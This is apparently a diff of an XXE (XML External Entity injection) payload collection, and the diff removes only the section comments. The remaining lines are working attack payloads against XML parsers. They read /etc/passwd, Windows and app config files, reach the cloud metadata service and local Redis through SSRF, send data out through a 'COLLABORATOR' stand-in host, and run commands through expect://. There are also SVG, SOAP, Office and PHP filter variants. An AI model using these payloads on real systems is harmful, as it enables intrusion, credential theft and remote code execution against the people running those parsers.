@@ -1,8 +1,3 @@
-# ============================================================
-# XXE — XML External Entity Injection
-# ============================================================
-
-# ---- Basic File Read (Linux) ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <root>&xxe;</root>
@@ -31,7 +26,6 @@
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config/database.yml">]>
 <root>&xxe;</root>
 
-# ---- Basic File Read (Windows) ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
 <root>&xxe;</root>
@@ -44,7 +38,6 @@
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]>
 <root>&xxe;</root>
 
-# ---- SSRF via XXE ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
 <root>&xxe;</root>
@@ -61,7 +54,6 @@
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
 <root>&xxe;</root>
 
-# ---- Blind XXE — OOB ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe.dtd"> %xxe;]>
 <root>&exfil;</root>
@@ -74,7 +66,6 @@
 ]>
 <root/>
 
-# ---- Error-Based XXE ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -83,19 +74,16 @@
   %error;
 ]>
 
-# ---- XInclude ----
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
 
-# ---- SVG ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&xxe;</text>
 </svg>
 
-# ---- SOAP ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
@@ -104,19 +92,16 @@
   </soap:Body>
 </soap:Envelope>
 
-# ---- Office ----
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR/xxe">]>
 <w:document>&xxe;</w:document>
 
-# ---- Protocol Bypass ----
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO%0d%0a">
 <!ENTITY xxe SYSTEM "expect://id">
 <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
 <!ENTITY xxe SYSTEM "jar:file:///var/app/app.jar!/META-INF/MANIFEST.MF">
 
-# ---- PHP ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
 <root>&xxe;</root>
@@ -125,7 +110,6 @@
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">]>
 <root>&xxe;</root>
 
-# ---- RCE (if enabled) ----
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
 <root>&xxe;</root>
